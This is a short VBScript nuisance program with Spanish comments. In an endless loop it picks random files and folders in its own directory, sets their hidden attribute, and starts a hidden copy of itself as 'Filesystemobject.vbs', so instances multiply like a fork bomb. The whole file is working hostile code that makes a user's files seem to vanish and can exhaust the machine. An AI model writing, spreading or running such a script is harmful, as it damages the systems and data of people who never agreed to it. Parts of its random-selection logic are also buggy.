do
'########################################################################
MsgBox("Archivo Oculto! :D")
Set objFSO = CreateObject("Scripting.FileSystemObject")
objStartFolder = objFSO.GetAbsolutePathName("")
Set objFolder = objFSO.GetFolder(objStartFolder)
Set colFiles = objFolder.Files
Set colSubDire = objFolder.SubFolders

'el numero 100000 es arbitrario, en este lugar debe ir el numero de archivos
'y carpetas en una carpeta pero no se como crear un array con tamaño variable en vbs
Dim arrGroc(100000)
var1 = 0

For Each objFile in colFiles
	arrGroc(var1) = objFile.Name
	var1 = var1 + 1
Next

For Each colSubDir in colSubDire
	arrGroc(var1) = colSubDir.Name
	var1 = var1 + 1
Next

Dim max,min
max=var1
min=0
Randomize
'MsgBox(max)

strFile = objFolder+"\"+arrGroc(Int((max-min+1)*Rnd+min))
'MsgBox(strFile)

boolHide = True
set objFile2 = objFSO.GetFile(strFile)
if boolHide = True then
   if objFile2.Attributes AND 2 then
      'MsgBox("File already hidden")
   else
      objFile2.Attributes = objFile2.Attributes + 2 
      'MsgBox("File is now hidden")
   end if 
end if
'########################################################################
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "Filesystemobject.vbs" & Chr(34), 0
Set WshShell = Nothing
loop